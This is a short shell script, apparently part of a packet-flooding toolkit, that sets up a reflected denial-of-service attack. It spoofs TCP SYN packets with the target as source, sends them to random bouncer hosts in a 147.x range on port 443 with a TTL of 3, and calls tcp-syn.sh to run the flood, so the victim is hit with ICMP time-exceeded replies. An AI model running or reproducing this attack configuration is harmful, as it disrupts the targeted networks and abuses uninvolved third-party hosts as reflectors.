
# generates TCP-SYN with TARGET as source, BOUNCERS as dest and low TTL
# turns syn flood in icmp ttl expiration flood

SRCIP="X"
DSTIP="147,drnd(1),drnd(1),drnd(1)"
SRCPORT="rnd(2)"
DSTPORT="c16(443)"
TTL="3"
TIME="1"

. ./lib.sh

sh ./tcp-syn.sh -s"$SRCIP" -d"$DSTIP" -S"$SRCPORT" -D"$DSTPORT" -t"$TTL" -n"$NUM" -T"$TIME" -g"$GAP"
#sh ./icmp-echo.sh -s"$SRCIP" -d"$DSTIP" -t"$TTL" -n$NUM -T$TIME -g$GAP
